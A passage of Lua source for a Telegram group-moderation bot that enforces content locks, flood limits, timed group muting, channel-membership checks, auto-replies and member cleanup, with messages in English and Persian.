          local arabic_msg = msg.text:match("[\216-\219][\128-\191]")
          if arabic_msg and lock_arabic == "yes" then
            del_msg(chat, tonumber(msg.id))
            if sense and 0 < redis:ttl("CheckThisMsg" .. user) then
              SenseGiveWarn(msg, "arabic IS Locked!")
            end
            if 0 > redis:ttl("CheckThisMsg" .. user) then
              redis:setex("CheckThisMsg" .. user, 60, true)
            end
          end
          local eng_text = msg.text:match("[AaBbCcDdEeFfGgHhIiJjKkLlMmNnOoPpQqRrSsTtUuVvWwXxYyZz]")
          if eng_text and lock_english == "yes" then
            del_msg(chat, tonumber(msg.id))
          end
        end
        if redis:sismember("GroupSilentUsers:" .. msg.to.id, msg.from.id) then
          del_msg(chat, tonumber(msg.id))
        end
        if mute_all == "yes" then
          if redis:get("LockGpH1:" .. msg.chat_id_) then
            h1 = redis:get("LockGpH1:" .. chat)
            h2 = redis:get("LockGpH2:" .. chat)
            t = os.date():match("%d+:%d+")
            currentTime = t:gsub(":", "")
            if redis:get("CheckLockIsOtherDay" .. chat) then
              if tonumber(currentTime) < tonumber(h1) and tonumber(currentTime) ~= tonumber(h1) and tonumber(h2) <= tonumber(currentTime) then
                redis:hdel("GroupSettings:" .. msg.chat_id_, "mute_all")
                lang = redis:get("gp_lang:" .. msg.chat_id_)
                if not lang then
                  text = "*Group has been unlocked!*"
                  tdcli.sendMessage(chat, msg.id_, 0, text, 0, "md")
                else
                  text = "*\217\130\217\129\217\132 \218\175\216\177\217\136\217\135 \217\135\217\133 \216\167\218\169\217\134\217\136\217\134 \216\168\216\167\216\178 \216\180\216\175!*"
                  tdcli.sendMessage(chat, msg.id_, 0, text, 0, "md")
                end
              end
            elseif not redis:get("CheckLockIsOtherDay" .. chat) and tonumber(h2) <= tonumber(currentTime) then
              redis:hdel("GroupSettings:" .. msg.chat_id_, "mute_all")
              lang = redis:get("gp_lang:" .. msg.chat_id_)
              if not lang then
                text = "*Group has been unlocked!*"
                tdcli.sendMessage(chat, msg.id_, 0, text, 0, "md")
              else
                text = "*\217\130\217\129\217\132 \218\175\216\177\217\136\217\135 \217\135\217\133 \216\167\218\169\217\134\217\136\217\134 \216\168\216\167\216\178 \216\180\216\175!*"
                tdcli.sendMessage(chat, msg.id_, 0, text, 0, "md")
              end
            end
          end
        elseif mute_all == "no" and redis:get("LockGpH1:" .. chat) then
          h1 = redis:get("LockGpH1:" .. chat)
          h2 = redis:get("LockGpH2:" .. chat)
          t = os.date():match("%d+:%d+")
          currentTime = t:gsub(":", "")
          if currentTime == "No connection" then
            SendError(msg, "*Server Time Has A Problem Please Try Again Later!*", "*\216\178\217\133\216\167\217\134 \216\179\216\177\217\136\216\177 \219\140\218\169 \217\133\216\180\218\169\217\132 \216\175\216\167\216\177\216\175 \217\132\216\183\217\129\216\167 \216\168\216\185\216\175\216\167 \216\175\217\136\216\168\216\167\216\177\217\135 \216\170\217\132\216\167\216\180 \218\169\217\134\219\140\216\175!*")
            redis:del("LockGpH1:" .. msg.chat_id_)
            redis:del("LockGpH2:" .. msg.chat_id_)
          elseif tonumber(h1) <= tonumber(currentTime) and tonumber(h2) > tonumber(currentTime) then
            if tonumber(h1) < tonumber(h2) then
              redis:del("CheckLockIsOtherDay" .. chat)
            elseif tonumber(h1) > tonumber(h2) then
              redis:set("CheckLockIsOtherDay" .. chat, true)
            end
            data = load_data("./data/moderation.json")
            redis:hset("GroupSettings:" .. msg.chat_id_, "mute_all", "yes")
            save_data("./data/moderation.json", data)
            lang = redis:get("gp_lang:" .. msg.chat_id_)
            if not lang then
              text = "*Group is locked on this time and Lock all has been enabled*"
              tdcli.sendMessage(chat, msg.id_, 0, text, 0, "md")
            else
              text = "*\218\175\216\177\217\136\217\135 \216\175\216\177 \216\167\219\140\217\134 \216\178\217\133\216\167\217\134 \217\130\217\129\217\132 \216\167\216\179\216\170 \217\136 \217\130\217\129\217\132 \217\135\217\133\217\135 \216\168\216\167 \217\133\217\136\217\129\217\130\219\140\216\170 \217\129\216\185\216\167\217\132 \216\180\216\175*"
              tdcli.sendMessage(chat, msg.id_, 0, text, 0, "md")
            end
          end
        end
        if msg.content_.entities_ and msg.content_.entities_[0] then
          if msg.content_.entities_[0].ID == "MessageEntityMentionName" and lock_mention == "yes" then
            del_msg(chat, tonumber(msg.id))
          end
          if (msg.content_.entities_[0].ID == "MessageEntityUrl" or msg.content_.entities_[0].ID == "MessageEntityTextUrl") and lock_webpage == "yes" then
            del_msg(chat, tonumber(msg.id))
          end
          if (msg.content_.entities_[0].ID == "MessageEntityBold" or msg.content_.entities_[0].ID == "MessageEntityCode" or msg.content_.entities_[0].ID == "MessageEntityPre" or msg.content_.entities_[0].ID == "MessageEntityItalic") and lock_markdown == "yes" then
            del_msg(chat, tonumber(msg.id))
          end
        end
        if lock_flood == "yes" then
          local hash = "user:" .. user .. ":msgs"
          local msgs = tonumber(redis:get(hash) or 0)
          local NUM_MSG_MAX = 5
          if redis:hget("GroupSettings:" .. msg.chat_id_, "num_msg_max") then
            NUM_MSG_MAX = tonumber(redis:hget("GroupSettings:" .. msg.chat_id_, "num_msg_max"))
          end
          if NUM_MSG_MAX <= msgs + 1 then
            if is_mod(msg) then
              return
            end
            if msg.adduser and msg.from.id then
              return
            end
            if redis:get("sender:" .. user .. ":flood") then
              return
            else
              if redis:hget("GroupSettings:" .. chat, "flood_reaction") then
                tdcli.deleteMessagesFromUser(chat, user, dl_cb, nil)
                if sense then
                  if not lang then
                    SenseGiveWarn(msg, "Flooding")
                  else
                    SenseGiveWarn(msg, "\216\167\216\177\216\179\216\167\217\132 \217\190\219\140\216\167\217\133 \216\177\218\175\216\168\216\167\216\177\219\140")
                  end
                end
              else
                kick_user(user, chat)
                SendStatus(chat, user, "Kicked For Flooding", "\216\168\216\177\216\167\219\140 \217\190\219\140\216\167\217\133 \216\177\218\175\216\168\216\167\216\177\219\140 \217\133\216\179\216\175\217\136\216\175 \216\180\216\175")
              end
              if not redis:hget("GroupSettings:" .. chat, "FloodTime") then
                FloodTime = 30
              else
                FloodTime = tonumber(redis:hget("GroupSettings:" .. chat, "FloodTime"))
              end
              redis:setex("sender:" .. user .. ":flood", FloodTime, true)
            end
          end
          redis:setex(hash, 2, msgs + 1)
        end
        if redis:hget("GroupSettings:" .. chat, "group_channel") then
          Helper = redis:hget("GroupSettings:" .. chat, "group_helper") or _config.Token
          channel = redis:hget("GroupSettings:" .. chat, "group_channel")
          https = require("ssl.https")
          local url, res = https.request("https://api.telegram.org/bot" .. Helper .. "/getchatmember?chat_id=" .. channel .. "&user_id=" .. user)
          data = json:decode(url)
          if data.description ~= "Bad Request: CHAT_ADMIN_REQUIRED" then
            if res ~= 200 or data.result.status == "left" or data.result.status == "kicked" then
              del_msg(chat, tonumber(msg.id))
              if redis:sismember("GroupsCheckedChannelUsers:" .. chat, user) then
                redis:srem("GroupsCheckedChannelUsers:" .. chat, user)
              end
            elseif data.ok and not redis:sismember("GroupsCheckedChannelUsers:" .. chat, user) then
              redis:sadd("GroupsCheckedChannelUsers:" .. chat, user)
              if not lang then
                tdcli.sendMention(chat, 0, msg.from.first_name .. " You Can Now Send Message!", 0, tonumber(Slen(msg.from.first_name)), user)
              else
                tdcli.sendMention(chat, 0, msg.from.first_name .. " \216\180\217\133\216\167 \216\167\218\169\217\134\217\136\217\134 \217\130\216\167\216\175\216\177 \216\168\217\135 \216\167\216\177\216\179\216\167\217\132 \217\190\219\140\216\167\217\133 \217\135\216\179\216\170\219\140\216\175!", 0, tonumber(Slen(msg.from.first_name)), user)
              end
            end
          end
        end
      end
    end
  else
  end
  if not redis:get("AutoDeleteCache") then
    redis:setex("AutoDeleteCache", 18000, true)
    run_bash("rm -rf ~/.telegram-cli/data/sticker/*")
    run_bash("rm -rf ~/.telegram-cli/data/photo/*")
    run_bash("rm -rf ~/.telegram-cli/data/animation/*")
    run_bash("rm -rf ~/.telegram-cli/data/video/*")
    run_bash("rm -rf ~/.telegram-cli/data/audio/*")
    run_bash("rm -rf ~/.telegram-cli/data/voice/*")
    run_bash("rm -rf ~/.telegram-cli/data/temp/*")
    run_bash("rm -rf ~/.telegram-cli/data/thumb/*")
    run_bash("rm -rf ~/.telegram-cli/data/document/*")
    run_bash("rm -rf ~/.telegram-cli/data/profile_photo/*")
    run_bash("rm -rf ~/.telegram-cli/data/encrypted/*")
  end
  if msg.to.type == "pv" and redis:get("EditBot:botmonshi") and not redis:get("~ShowBotMonshiMin~" .. msg.from.id) then
    T_ = redis:get("EditBot:botmonshitime") or 5
    T = tonumber(T_) * 60
    redis:setex("~ShowBotMonshiMin~" .. msg.from.id, T, true)
    tdcli.sendMessage(msg.chat_id_, msg.id_, 1, redis:get("EditBot:botmonshi"), 1, "md")
  end
  if (is_botOwner(msg) or is_sudo(msg)) and not redis:sismember("BotHaveRankMembers", msg.from.id) then
    redis:sadd("BotHaveRankMembers", msg.from.id)
  elseif (is_mod(msg) or is_owner(msg)) and not is_sudo(msg) and redis:sismember("BotHaveRankMembers", msg.from.id) then
    redis:srem("BotHaveRankMembers", msg.from.id)
  elseif (is_mod(msg) or is_owner(msg)) and not is_sudo(msg) and not redis:sismember("BotHaveRankMembers(Group)" .. msg.to.id, msg.from.id) then
    redis:sadd("BotHaveRankMembers(Group)" .. msg.to.id, msg.from.id)
  elseif not is_mod(msg) and redis:sismember("BotHaveRankMembers", msg.from.id) then
    redis:srem("BotHaveRankMembers", msg.from.id)
  elseif not is_mod(msg) and redis:sismember("BotHaveRankMembers(Group)" .. msg.to.id, msg.from.id) then
    redis:srem("BotHaveRankMembers(Group)" .. msg.to.id, msg.from.id)
  end
  if msg.text and redis:get("WaitForSetRules:" .. msg.to.id .. ":" .. msg.from.id) then
    if msg.text:match("^[Cc][Aa][Nn][Cc][Ee][Ll]$") then
      redis:del("WaitForSetRules:" .. msg.to.id .. ":" .. msg.from.id)
      if not lang then
        tdcli.sendMessage(msg.chat_id_, msg.id_, 1, "Set Rules Proccess `Canceled!`", 1, "md")
      else
        tdcli.sendMessage(msg.chat_id_, msg.id_, 1, "\217\129\216\177\216\162\219\140\217\134\216\175 \216\170\217\134\216\184\219\140\217\133 \217\130\217\136\216\167\217\134\219\140\217\134 `\217\132\216\186\217\136 \216\180\216\175!`", 1, "md")
      end
    else
      redis:hset("GroupSettings:" .. msg.to.id, "rules", msg.text)
      redis:del("WaitForSetRules:" .. msg.to.id .. ":" .. msg.from.id)
      if not lang then
        tdcli.sendMessage(msg.chat_id_, msg.id_, 1, "Group Rules Changed To:\n" .. msg.text, 1, "md")
      else
        tdcli.sendMessage(msg.chat_id_, msg.id_, 1, "\217\130\217\136\216\167\217\134\219\140\217\134 \218\175\216\177\217\136\217\135 \216\170\216\186\219\140\219\140\216\177 \218\169\216\177\216\175 \216\168\217\135:\n" .. msg.text, 1, "md")
      end
    end
  end
  if msg.text and not redis:hget("GroupSettings:" .. msg.to.id, "lock_botchat") then
    ReplyHash = redis:smembers("BotReply:" .. msg.text)
    if #ReplyHash ~= 0 then
      tester = true
      ReplyAccess = redis:get("BotReplyAccess:" .. msg.text)
      if not ReplyAccess then
        tester = true
      elseif ReplyAccess == "sudo" then
        if not is_sudo(msg) then
          tester = false
        end
      elseif ReplyAccess == "owner" then
        if not is_owner(msg) then
          tester = false
        end
      elseif ReplyAccess == "moderator" and not is_mod(msg) then
        tester = false
      end
      if tester == true then
        function WhatISReply(msg)
          test = {}
          for k, v in pairs(ReplyHash) do
            table.insert(test, v)
          end
          return test
        end
        Rando = WhatISReply(msg)[math.random(#WhatISReply(msg))]
        Rando = Rando:gsub("GPNAME", msg.to.title)
        Rando = Rando:gsub("USERID", msg.from.id)
        Rando = Rando:gsub("NAME", msg.from.first_name)
        Rank_ = redis:get("GetRankForUser:" .. msg.from.id .. ":" .. msg.to.id) or ""
        Rando = Rando:gsub("RANK", Rank_)
        tdcli.sendMessage(msg.chat_id_, msg.id_, 1, Rando, 1, "md")
      end
    end
  end
  if msg.text and redis:get("WaitForAddGift:" .. msg.from.id .. ":" .. msg.to.id) then
    if msg.text:match("^(%d+)$") and 0 < tonumber(msg.text) then
      GiftName = redis:get("WaitForAddGift:" .. msg.from.id .. ":" .. msg.to.id)
      redis:setex("BotAddedGift:" .. GiftName, 3600, tonumber(msg.text))
      tdcli.sendMessage(msg.chat_id_, msg.id_, 1, "\216\179\216\167\216\174\216\170 \217\135\216\175\219\140\217\135 \216\168\216\167 \218\169\216\175 `" .. GiftName .. "` \216\167\217\134\216\172\216\167\217\133 \216\180\216\175\n\n\216\167\219\140\217\134 \218\169\216\175 \216\168\217\135 \217\133\216\175\216\170 `" .. msg.text .. "` \216\177\217\136\216\178 \216\168\217\135 \216\180\216\167\216\177\218\152 \218\175\216\177\217\136\217\135 \216\167\216\182\216\167\217\129\217\135 \217\133\219\140\218\169\217\134\216\175 \217\136 \217\129\217\130\216\183 \219\140\218\169\216\168\216\167\216\177 \217\133\217\136\216\177\216\175 \216\167\216\179\216\170\217\129\216\167\216\175\217\135 \217\130\216\177\216\167\216\177 \217\133\219\140\218\175\219\140\216\177\216\175\n\n\216\168\216\177\216\167\219\140 \216\167\216\179\216\170\217\129\216\167\216\175\217\135 \216\167\216\178 \218\169\216\175 \216\175\216\177 \218\175\216\177\217\136\217\135\216\170\216\167\217\134 \216\175\216\179\216\170\217\136\216\177 \216\178\219\140\216\177 \216\177\216\167 \217\136\216\167\216\177\216\175 \218\169\217\134\219\140\216\175:\n`\217\135\216\175\219\140\217\135 " .. GiftName .. "`", 1, "md")
      redis:del("WaitForAddGift:" .. msg.from.id .. ":" .. msg.to.id)
    elseif msg.text:match("^[Cc][Aa][Nn][Cc][Ee][Ll]$") then
      redis:del("WaitForAddGift:" .. msg.from.id .. ":" .. msg.to.id)
      tdcli.sendMessage(msg.chat_id_, msg.id_, 1, "\217\129\216\177\216\162\219\140\217\134\216\175 \216\179\216\167\216\174\216\170 \218\169\216\175 \217\135\216\175\219\140\217\135 \217\132\216\186\217\136 \216\180\216\175", 1, "md")
    end
  end
  if msg.text and redis:get("WaitForCleanMembers:" .. msg.from.id .. ":" .. msg.to.id) and msg.to.type == "channel" then
    if msg.text == "1" then
      redis:del("WaitForCleanMembers:" .. msg.from.id .. ":" .. msg.to.id)
      channel_id = msg.to.id:gsub("-100", "")
      if not lang then
        tdcli.sendMessage(msg.chat_id_, msg.id_, 1, "Members Cleaned!", 1, "md")
      else
        tdcli.sendMessage(msg.chat_id_, msg.id_, 1, "\216\167\216\185\216\182\216\167 \217\190\216\167\218\169\216\179\216\167\216\178\219\140 \216\180\216\175\217\134\216\175!", 1, "md")
      end
      function CleanMember(arg, data)
        for k, v in pairs(data.members_) do
          if not isModerator(msg.to.id, v.user_id_) and v.user_id_ ~= bot.id then
            kick_user(v.user_id_, msg.to.id)
          end
        end
      end
      tdcli_function({
        ID = "GetChannelMembers",
        channel_id_ = channel_id,
        offset_ = 0,
        limit_ = 1000
      }, CleanMember, nil)
    elseif msg.text == "0" then
      redis:del("WaitForCleanMembers:" .. msg.from.id .. ":" .. msg.to.id)
      if not lang then
        tdcli.sendMessage(msg.chat_id_, msg.id_, 1, "Clean Members Process Canceled!", 1, "md")
      else
        tdcli.sendMessage(msg.chat_id_, msg.id_, 1, "\217\129\216\177\216\162\219\140\217\134\216\175 \217\190\216\167\218\169\216\179\216\167\216\178\219\140 \216\167\216\185\216\182\216\167 \217\132\216\186\217\136 \216\180\216\175!", 1, "md")
      end
    end
  end
  if msg.text and redis:get("WaitForChangeCharge:" .. msg.from.id .. ":" .. msg.to.id) then
    Note = redis:get("WaitForChangeCharge:" .. msg.from.id .. ":" .. msg.to.id)
    if msg.text == "1" then
      if not lang then
        tdcli.sendMessage(msg.chat_id_, msg.id_, 1, "Notification Sent", 1, "md")
      else
        tdcli.sendMessage(msg.chat_id_, msg.id_, 1, "\216\167\216\185\217\132\216\167\217\134 \216\167\216\177\216\179\216\167\217\132 \216\180\216\175", 1, "md")
      end
      if not redis:get("gp_lang:" .. Note) then
        tdcli.sendMessage(Note, 0, 1, "Groups Charge Has Been Changed By Bot Admin!", 1, "md")
      else
        tdcli.sendMessage(Note, 0, 1, "\216\180\216\167\216\177\218\152 \218\175\216\177\217\136\217\135 \216\170\217\136\216\179\216\183 \216\167\216\175\217\133\219\140\217\134 \216\177\216\168\216\167\216\170 \216\170\216\186\219\140\219\140\216\177 \218\169\216\177\216\175!", 1, "md")
      end
      redis:del("WaitForChangeCharge:" .. msg.from.id .. ":" .. msg.to.id)
    elseif msg.text == "0" then
      if not lang then
        tdcli.sendMessage(msg.chat_id_, msg.id_, 1, "Notification Was Not Sent", 1, "md")
      else
        tdcli.sendMessage(msg.chat_id_, msg.id_, 1, "\216\167\216\185\217\132\216\167\217\134 \216\167\216\177\216\179\216\167\217\132 \217\134\216\180\216\175", 1, "md")
      end
      redis:del("WaitForChangeCharge:" .. msg.from.id .. ":" .. msg.to.id)
    end
  end
  if msg.text and redis:get("WaitForSetChannel:" .. msg.to.id .. ":" .. msg.from.id) then
    if msg.text:lower() == "skip" then
      redis:del("WaitForSetChannel:" .. msg.to.id .. ":" .. msg.from.id)
      if not lang then
        tdcli.sendMessage(msg.chat_id_, msg.id_, 1, "Done", 1, "md")
      else
        tdcli.sendMessage(msg.chat_id_, msg.id_, 1, "\216\167\217\134\216\172\216\167\217\133 \216\180\216\175", 1, "md")
      end
    elseif msg.text:match("(%d+):(.*)") then
      redis:hset("GroupSettings:" .. msg.to.id, "group_helper", msg.text)
      del_msg(msg.chat_id_, tonumber(msg.id))
      redis:del("WaitForSetChannel:" .. msg.to.id .. ":" .. msg.from.id)
      if not lang then
        tdcli.sendMessage(msg.chat_id_, 0, 1, "Token Saved!", 1, "md")
      else
        tdcli.sendMessage(msg.chat_id_, 0, 1, "\216\170\217\136\218\169\217\134 \216\176\216\174\219\140\216\177\217\135 \216\180\216\175!", 1, "md")
      end
    else
      redis:del("WaitForSetChannel:" .. msg.to.id .. ":" .. msg.from.id)
      if not lang then
        tdcli.sendMessage(msg.chat_id_, msg.id_, 1, "Token is Not Correct And Process Canceled!", 1, "md")
      else
        tdcli.sendMessage(msg.chat_id_, msg.id_, 1, "\216\170\217\136\218\169\217\134 \216\181\216\173\219\140\216\173 \217\134\219\140\216\179\216\170 \217\136 \216\185\217\133\217\132\219\140\216\167\216\170 \217\132\216\186\217\136 \216\180\216\175!", 1, "md")
      end
    end
  end
  if msg.text and redis:get("CleanVains:" .. msg.to.id .. ":" .. msg.from.id) == "w8" then
    if msg.text:match("^[Dd][Oo][Nn][Ee]$") then
      local VainMembers = function(arg, data)
        local vm = data.members_
        if not vm[0] then
          if not lang then
            tdcli.sendMessage(msg.chat_id_, 0, 1, "*No Members in This Group!*", 1, "md")
          else
            tdcli.sendMessage(msg.chat_id_, 0, 1, "\216\167\219\140\217\134 \218\175\216\177\217\136\217\135 \216\185\216\182\217\136\219\140 \217\134\216\175\216\167\216\177\216\175!", 1, "md")
          end
        else
          redis:del("CleanVains:" .. msg.to.id .. ":" .. msg.from.id)
          if not lang then
            tdcli.sendMessage(msg.chat_id_, 0, 1, "*All Vain Members Has Been Kicked!*", 1, "md")
          else
            tdcli.sendMessage(msg.chat_id_, 0, 1, "\217\135\217\133\217\135 \216\167\216\185\216\182\216\167 \216\168\219\140 \217\129\216\167\219\140\216\175\217\135 \216\167\216\174\216\177\216\167\216\172 \216\180\216\175\217\134\216\175!", 1, "md")
          end
          for k, v in pairs(data.members_) do
            NumChats = redis:get("getMessages:" .. v.user_id_ .. ":" .. msg.to.id) or 0
            if tonumber(NumChats) == 0 or tonumber(NumChats) == 1 then
              kick_user(v.user_id_, msg.to.id)
            end
          end
        end
      end
      tdcli_function({
        ID = "GetChannelMembers",
        channel_id_ = getChatId(msg.chat_id_).ID,
        offset_ = 0,
        limit_ = 10000
      }, VainMembers, nil)
    elseif msg.text:match("^[Cc][Aa][Nn][Cc][Ee][Ll]$") then
      redis:del("CleanVains:" .. msg.to.id .. ":" .. msg.from.id)
      if not lang then
        tdcli.sendMessage(msg.chat_id_, 0, 1, "*Clean Vain Members Process* `Canceled!`", 1, "md")
      else
        tdcli.sendMessage(msg.chat_id_, 0, 1, "\217\129\216\177\216\162\219\140\217\134\216\175 \217\190\216\167\218\169\216\179\216\167\216\178\219\140 \216\167\216\185\216\182\216\167 \216\168\219\140 \217\129\216\167\219\140\216\175\217\135 `\217\132\216\186\217\136 \216\180\216\175!`", 1, "md")
      end
    end
  end
  if msg.text and redis:get("ForAddSettings:" .. msg.to.id .. ":" .. msg.from.id) == "w8" then
    SettingsName = redis:get("AddSettingsName:" .. msg.to.id .. ":" .. msg.from.id)
    if msg.text:match("^[Cc][Aa][Nn][Cc][Ee][Ll]$") then
      redis:del("GroupAddSettingsItem:" .. msg.to.id .. ":" .. SettingsName)
      redis:del("AddSettingsName:" .. msg.to.id .. ":" .. msg.from.id)
      redis:del("ForAddSettings:" .. msg.to.id .. ":" .. msg.from.id)
      if not lang then
        tdcli.sendMessage(msg.chat_id_, 0, 1, "*Add Settings Process* `Canceled!`", 1, "md")
      else
        tdcli.sendMessage(msg.chat_id_, 0, 1, "\217\129\216\177\216\162\219\140\217\134\216\175 \216\167\216\182\216\167\217\129\217\135 \218\169\216\177\216\175\217\134 \216\170\217\134\216\184\219\140\217\133\216\167\216\170 `\217\132\216\186\217\136 \216\180\216\175!`", 1, "md")
      end
    elseif msg.text:match("^[Dd][Oo][Nn][Ee]$") then
      redis:sadd("GroupAddSettings:" .. msg.to.id, SettingsName)
      if not lang then
        tdcli.sendMessage(msg.chat_id_, 0, 1, [[
*Done!*
[`]] .. SettingsName .. "`] Settings Has Been Added", 1, "md")
      else
        tdcli.sendMessage(msg.chat_id_, 0, 1, "\217\190\216\167\219\140\216\167\217\134!\n\216\170\217\134\216\184\219\140\217\133\216\167\216\170 [`" .. SettingsName .. "`] \216\167\216\182\216\167\217\129\217\135 \216\180\216\175", 1, "md")
      end
      redis:del("AddSettingsName:" .. msg.to.id .. ":" .. msg.from.id)
      redis:del("ForAddSettings:" .. msg.to.id .. ":" .. msg.from.id)
    elseif msg.text == "link" or msg.text == "\217\132\219\140\217\134\218\169" then
      redis:sadd("GroupAddSettingsItem:" .. msg.to.id .. ":" .. SettingsName, "lock_link")
    elseif msg.text == "tag" or msg.text == "\216\170\218\175" then
      redis:sadd("GroupAddSettingsItem:" .. msg.to.id .. ":" .. SettingsName, "lock_tag")
    elseif msg.text == "username" or msg.text == "\219\140\217\136\216\178\216\177\217\134\219\140\217\133" then
      redis:sadd("GroupAddSettingsItem:" .. msg.to.id .. ":" .. SettingsName, "lock_username")
    elseif msg.text == "mention" or msg.text == "\217\133\217\134\216\180\217\134" then
      redis:sadd("GroupAddSettingsItem:" .. msg.to.id .. ":" .. SettingsName, "lock_mention")
    elseif msg.text == "arabic" or msg.text == "\216\185\216\177\216\168\219\140" then
      redis:sadd("GroupAddSettingsItem:" .. msg.to.id .. ":" .. SettingsName, "lock_arabic")
    elseif msg.text == "edit" or msg.text == "\216\167\216\175\219\140\216\170" then
      redis:sadd("GroupAddSettingsItem:" .. msg.to.id .. ":" .. SettingsName, "lock_edit")
    elseif msg.text == "spam" or msg.text == "\216\167\216\179\217\190\217\133" then
      redis:sadd("GroupAddSettingsItem:" .. msg.to.id .. ":" .. SettingsName, "lock_spam")
    elseif msg.text == "flood" or msg.text == "\217\190\219\140\216\167\217\133 \216\177\218\175\216\168\216\167\216\177\219\140" then
      redis:sadd("GroupAddSettingsItem:" .. msg.to.id .. ":" .. SettingsName, "flood")
    elseif msg.text == "bots" or msg.text == "\216\177\216\168\216\167\216\170 \217\135\216\167" then
      redis:sadd("GroupAddSettingsItem:" .. msg.to.id .. ":" .. SettingsName, "lock_bots")
    elseif msg.text == "markdown" or msg.text == "\217\129\217\136\217\134\216\170" then
      redis:sadd("GroupAddSettingsItem:" .. msg.to.id .. ":" .. SettingsName, "lock_markdown")
    elseif msg.text == "webpage" or msg.text == "\216\181\217\129\216\173\216\167\216\170 \217\136\216\168" then
      redis:sadd("GroupAddSettingsItem:" .. msg.to.id .. ":" .. SettingsName, "lock_webpage")
    elseif msg.text == "pin" or msg.text == "\216\179\217\134\216\172\216\167\217\130" then
      redis:sadd("GroupAddSettingsItem:" .. msg.to.id .. ":" .. SettingsName, "lock_pin")
    elseif msg.text == "maxwords" or msg.text == "\216\173\216\175\216\167\218\169\216\171\216\177 \218\169\217\132\217\133\216\167\216\170" then
      redis:sadd("GroupAddSettingsItem:" .. msg.to.id .. ":" .. SettingsName, "lock_MaxWords")
    elseif msg.text == "botchat" or msg.text == "\218\134\216\170 \216\177\216\168\216\167\216\170" then
      redis:sadd("GroupAddSettingsItem:" .. msg.to.id .. ":" .. SettingsName, "lock_botchat")
    elseif msg.text == "fohsh" or msg.text == "\217\129\216\173\216\180" then
      redis:sadd("GroupAddSettingsItem:" .. msg.to.id .. ":" .. SettingsName, "lock_fohsh")
    elseif msg.text == "english" or msg.text == "\216\167\217\134\218\175\217\132\219\140\216\179\219\140" then
      redis:sadd("GroupAddSettingsItem:" .. msg.to.id .. ":" .. SettingsName, "lock_english")
    elseif msg.text == "all" or msg.text == "\217\135\217\133\217\135" then
      redis:sadd("GroupAddSettingsItem:" .. msg.to.id .. ":" .. SettingsName, "mute_all")
    elseif msg.text == "gif" or msg.text == "\218\175\219\140\217\129" then
      redis:sadd("GroupAddSettingsItem:" .. msg.to.id .. ":" .. SettingsName, "mute_gif")
    elseif msg.text == "text" or msg.text == "\217\133\216\170\217\134" then
      redis:sadd("GroupAddSettingsItem:" .. msg.to.id .. ":" .. SettingsName, "mute_text")
    elseif msg.text == "photo" or msg.text == "\216\185\218\169\216\179" then
      redis:sadd("GroupAddSettingsItem:" .. msg.to.id .. ":" .. SettingsName, "mute_photo")
    elseif msg.text == "video" or msg.text == "\217\129\219\140\217\132\217\133" then
      redis:sadd("GroupAddSettingsItem:" .. msg.to.id .. ":" .. SettingsName, "mute_video")
    elseif msg.text == "audio" or msg.text == "\216\162\217\135\217\134\218\175" then
      redis:sadd("GroupAddSettingsItem:" .. msg.to.id .. ":" .. SettingsName, "mute_audio")
    elseif msg.text == "voice" or msg.text == "\216\181\216\175\216\167" or msg.text == "\216\181\216\175\216\167" then
      redis:sadd("GroupAddSettingsItem:" .. msg.to.id .. ":" .. SettingsName, "mute_voice")
    elseif msg.text == "sticker" or msg.text == "\216\167\216\179\216\170\219\140\218\169\216\177" then
      redis:sadd("GroupAddSettingsItem:" .. msg.to.id .. ":" .. SettingsName, "mute_sticker")
    elseif msg.text == "contact" or msg.text == "\217\133\216\174\216\167\216\183\216\168" then
      redis:sadd("GroupAddSettingsItem:" .. msg.to.id .. ":" .. SettingsName, "mute_contact")
    elseif msg.text == "forward" or msg.text == "\217\129\217\136\216\177\217\136\216\167\216\177\216\175" then
      redis:sadd("GroupAddSettingsItem:" .. msg.to.id .. ":" .. SettingsName, "mute_forward")
    elseif msg.text == "location" or msg.text == "\217\133\218\169\216\167\217\134" then
      redis:sadd("GroupAddSettingsItem:" .. msg.to.id .. ":" .. SettingsName, "mute_location")
    elseif msg.text == "document" or msg.text == "\217\129\216\167\219\140\217\132" then
      redis:sadd("GroupAddSettingsItem:" .. msg.to.id .. ":" .. SettingsName, "mute_document")
    elseif msg.text == "tgservice" or msg.text == "\216\174\216\175\217\133\216\167\216\170 \216\170\217\132\218\175\216\177\216\167\217\133" then
      redis:sadd("GroupAddSettingsItem:" .. msg.to.id .. ":" .. SettingsName, "mute_tgservice")
    elseif msg.text == "inline" or msg.text == "\216\167\219\140\217\134\217\132\216\167\219\140\217\134" then
      redis:sadd("GroupAddSettingsItem:" .. msg.to.id .. ":" .. SettingsName, "mute_inline")
    elseif msg.text == "game" or msg.text == "\216\168\216\167\216\178\219\140" or msg.text == "\216\168\216\167\216\178\219\140 \217\135\216\167\219\140 \216\162\217\134\217\132\216\167\219\140\217\134" then
      redis:sadd("GroupAddSettingsItem:" .. msg.to.id .. ":" .. SettingsName, "mute_game")
    elseif msg.text == "keyboard" or msg.text == "\218\169\219\140\216\168\217\136\216\177\216\175" or msg.text == "\216\181\217\129\216\173\217\135 \218\169\217\132\219\140\216\175" then
      redis:sadd("GroupAddSettingsItem:" .. msg.to.id .. ":" .. SettingsName, "mute_keyboard")
    elseif msg.text == "forcedinvite" or msg.text == "forced invite" or msg.text == "\216\175\216\185\217\136\216\170 \216\167\216\172\216\168\216\167\216\177\219\140" then
      redis:sadd("GroupAddSettingsItem:" .. msg.to.id .. ":" .. SettingsName, "lock_forcedinvite")
    elseif msg.text == "join" or msg.text == "\217\136\216\177\217\136\216\175" then
      redis:sadd("GroupAddSettingsItem:" .. msg.to.id .. ":" .. SettingsName, "lock_join")
    elseif msg.text == "note" or msg.text == "video note" or msg.text == "\217\190\219\140\216\167\217\133 \217\136\219\140\216\175\216\166\217\136\219\140\219\140" or msg.text == "\217\190\219\140\216\167\217\133 \217\136\219\140\216\175\219\140\217\136\219\140\219\140" then
      redis:sadd("GroupAddSettingsItem:" .. msg.to.id .. ":" .. SettingsName, "lock_note")
    elseif msg.text == "\216\178\219\140\216\177\217\134\217\136\219\140\216\179 \216\175\216\167\216\177" then
      redis:sadd("GroupAddSettingsItem:" .. msg.to.id .. ":" .. SettingsName, "lock_withcaption")
    elseif msg.text == "\216\168\216\175\217\136\217\134 \216\178\219\140\216\177\217\134\217\136\219\140\216\179" then
      redis:sadd("GroupAddSettingsItem:" .. msg.to.id .. ":" .. SettingsName, "lock_nocaption")
    end
  end
  local data = load_data("./data/moderation.json")
  local welcome_cb = function(arg, data)
    local lang = redis:get("gp_lang:" .. arg.chat_id)
    if redis:get("GroupWelcome" .. msg.chat_id_) then
